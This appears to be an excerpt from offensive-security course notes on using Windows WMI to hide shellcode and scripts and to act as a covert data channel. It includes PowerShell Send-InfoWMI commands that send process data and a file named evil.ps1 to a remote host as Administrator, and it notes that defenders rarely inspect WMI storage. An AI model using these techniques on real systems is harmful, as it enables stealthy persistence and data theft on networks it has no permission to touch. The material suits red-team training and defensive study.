


-  WMI is amazingly helpful for storage of information, instructions, shellcode, scripts etc. as
namespaces, classes, registry etc. (and if you like on disk in text and other files.)
-  We have already used WMI namespaces for storage of command/script output in Invoke-
PowerShellWmi and StdRegProv for storing output in Registry in Invoke-WmiCommand.
-  Countermeasures are generally unaware of or lack ability to look for malicious code/scripts in WMI namespaces.


Using WMI as communication channel:
-  Use Send-InfoWmi.ps1 on the source to transfer data:

```powershell
Send-InfoWMI -DatatoSend (Get-Process) -ComputerName 192.168.11.2 -Username Administrator
```

-  To transfer file:

```powershell
Send-InfoWMI -FiletoSend C:\test\evil.ps1 -ComputerName 192.168.11.2 -Username Administrator
```

Inspired from:
https://github.com/mattifestation/WMI Backdoor


